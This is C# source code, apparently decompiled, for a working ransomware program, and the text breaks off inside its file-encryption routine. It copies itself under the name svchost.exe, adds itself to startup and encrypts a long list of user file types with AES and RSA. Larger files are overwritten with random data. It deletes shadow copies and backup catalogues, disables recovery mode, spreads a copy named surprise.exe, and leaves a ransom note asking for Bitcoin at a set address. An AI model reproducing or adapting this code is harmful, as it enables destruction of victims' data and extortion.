using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "READ_ME.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[14]
	{
		"All of your files have been encrypted", "Your computer was infected with a ransomware virus. Your files have been encrypted and you won't ", "be able to decrypt them without our help.What can I do to get my files back?You can buy our special ", "decryption software, this software will allow you to recover all of your data and remove the", "ransomware from your computer.The price for the software is $1,500. Payment can be made in Bitcoin only.", "How do I pay, where do I get Bitcoin?", "Purchasing Bitcoin varies from country to country, you are best advised to do a quick google search", "yourself  to find out how to buy Bitcoin. ", "Many of our customers have reported these sites to be fast and reliable:", "Coinmama - hxxps://www.coinmama.com Bitpanda - hxxps://www.bitpanda.com",
		"", "Payment informationAmount: 50Bucks", "Bitcoin Address:  32WykDVq3Ap7WHNMUvjDbAJ3ZzwRaaRLSf", ""
	};

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			string extension;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152L)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000L)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>zcH4zlbuY2dxCM0BZV4kpC+7BbE5XOVt7aLt26o0d6V6jX5Vb2E/XuUJjmE+PM9i+HB8t8ULBDTeJ9HIbJw0tRenSUwSS+VCDjQYKhTRIGlY3/A9xaB32LzvHUE+WjEWKzO1XloAk9OsO9y8IiW3AqJhSlX0qKRf1rmBQZZchlk=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
